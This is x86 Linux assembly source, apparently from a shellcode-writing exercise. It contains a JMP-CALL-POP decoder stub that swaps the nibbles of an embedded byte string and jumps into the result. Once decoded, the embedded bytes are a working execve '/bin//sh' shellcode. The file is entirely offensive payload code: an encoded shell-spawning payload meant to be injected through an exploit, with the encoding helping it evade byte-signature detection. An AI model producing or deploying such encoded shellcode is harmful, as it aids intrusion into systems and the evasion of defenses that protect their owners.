global _start

section .text
_start:
    jmp call_shellcode      ; Go to call_shellcode

decoder: 
    pop esi                 ; Get address of shellcode
    xor ebx,ebx             ; Clear EBX
    mul ebx                 ; Also clear EAX and EDX

decode:                     ; Main decode loop
    mov byte bl,[esi+eax]   ; Move next byte into BL
    ror bl,4                ; Rotate lowest byte 4 times (0xab -> 0xba)
    mov byte [esi+eax],bl   ; Move byte back into current offset in ESI

    cmp bl,bh               ; End of shellcode?
    jz shellcode            ; If so, execute shellcode

    inc al                  ; Otherwise, increment shellcode position
    jmp short decode        ; Go back to top of decode loop

call_shellcode:
    call decoder            ; Call decoder function
    shellcode: db 0x13,0x0c,0x05,0x86,0xf2,0xf2,0x37,0x86,0x86,0xf2,0x26,0x96,0xe6,0x98,0x3e,0x05,0x98,0x2e,0x35,0x98,0x1e,0x0b,0xb0,0xdc,0x08,0x00
